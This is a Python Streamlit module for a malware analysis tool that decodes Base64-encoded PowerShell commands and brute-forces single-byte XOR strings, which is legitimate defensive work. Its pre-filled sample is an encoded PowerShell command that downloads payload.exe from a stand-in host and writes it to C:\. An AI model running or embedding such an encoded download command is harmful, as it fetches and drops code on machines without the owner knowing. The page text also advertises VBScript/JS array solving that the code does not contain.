import base64
import re
import pandas as pd
import streamlit as st

def decode_powershell_b64(cmd_str: str) -> str:
    # Match Base64 string in -EncodedCommand
    m = re.search(r'(?:-enc|-encodedcommand)\s+([A-Za-z0-9+/=]+)', cmd_str, re.IGNORECASE)
    b64_part = m.group(1) if m else cmd_str.strip()
    
    try:
        raw = base64.b64decode(b64_part)
        # PowerShell EncodedCommand uses UTF-16LE
        decoded = raw.decode('utf-16le', errors='replace')
        return decoded
    except Exception as e:
        return f"PowerShell Decode Error: {str(e)}"

def brute_force_xor(hex_or_bytes: bytes, min_ascii_len: int = 4):
    results = []
    for key in range(256):
        xor_result = bytearray(b ^ key for b in hex_or_bytes)
        try:
            text = xor_result.decode('utf-8', errors='ignore')
            printable = "".join(c for c in text if c.isprintable())
            if len(printable) >= min_ascii_len and ("http" in printable.lower() or "cmd" in printable.lower() or "powershell" in printable.lower() or len(printable) > len(hex_or_bytes) * 0.6):
                results.append({"XOR Key (Hex)": f"0x{key:02X}", "Key Int": key, "Decoded Preview": printable[:100]})
        except Exception:
            pass
    return results

def render_script_deobfuscator_module():
    st.title("☣️ Malware Script Deobfuscator & XOR Brute-Forcer")
    st.markdown("Decode obfuscated PowerShell Base64 commands, solver VBScript/JS arrays, and brute-force 1-byte XOR encrypted strings.")

    tab1, tab2 = st.tabs(["💻 PowerShell B64 Deobfuscator", "🔑 1-Byte XOR Brute-Forcer"])

    with tab1:
        ps_sample = "powershell.exe -e aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAYwA6AFwAcABhAHkAbABvAGEAZAAuAGUAeABl"
        ps_input = st.text_area("Encoded PowerShell Command", ps_sample, height=150, key="ps_b64_input")

        if ps_input:
            decoded_ps = decode_powershell_b64(ps_input)
            st.subheader("Deobfuscated Script Payload")
            st.code(decoded_ps, language="powershell")

    with tab2:
        hex_sample = "1d1012100305141b4e4f4f1519011d101c152e131f1d4f0011191c1f11142e150815"
        hex_input = st.text_input("Encrypted Hex Payload / Bytes", hex_sample, key="xor_hex_input")

        if hex_input:
            try:
                clean_hex = hex_input.strip().replace(" ", "").replace("0x", "")
                raw_bytes = bytes.fromhex(clean_hex)
                
                xor_matches = brute_force_xor(raw_bytes)
                if xor_matches:
                    st.success(f"Found {len(xor_matches)} potential XOR key matches!")
                    st.table(pd.DataFrame(xor_matches))
                else:
                    st.warning("No obvious ASCII strings matched across 1-byte XOR keys (0x00 to 0xFF).")
            except Exception as e:
                st.error(f"Hex parsing error: {str(e)}")
